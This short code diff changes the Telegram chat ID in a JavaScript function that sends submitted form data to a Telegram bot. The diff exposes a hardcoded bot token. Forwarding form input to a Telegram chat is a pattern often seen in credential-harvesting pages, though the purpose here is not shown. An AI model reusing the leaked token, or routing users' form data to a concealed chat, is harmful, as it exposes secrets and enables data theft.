@@ -17,7 +17,7 @@ async function sendToTelegram(event) {
 
         // Send the message to Telegram
         const botToken = "7731316951:AAEiLzkQuVUNy95IoRZazBnUwX49xknNdZE";
-        const chatId = "-4598440447";
+        const chatId = "-1002284062400";
         const formattedMessage = formatMessage(formData);
 
         const response = await sendMessageToTelegram(botToken, chatId, formattedMessage);
